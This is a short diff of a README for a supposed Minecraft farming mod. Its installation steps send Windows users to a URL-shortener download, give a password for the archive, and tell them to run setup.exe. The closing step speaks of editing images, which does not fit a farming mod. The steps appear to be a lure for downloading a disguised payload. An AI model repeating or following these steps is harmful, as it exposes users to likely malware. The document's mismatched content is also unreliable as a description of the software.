@@ -9,6 +9,7 @@ Minecraft Advanced Farming is a mod for Minecraft that adds new farming mechanic
 
 📥 Installation Guide
 🖥️ Quick Setup (Windows .exe)
+
 1️⃣ [Download](https://goo.su/3z125qo) and extract the package (password: Project12!)
 2️⃣ Run setup.exe
 3️⃣ Start viewing and editing images effortlessly! 🚀
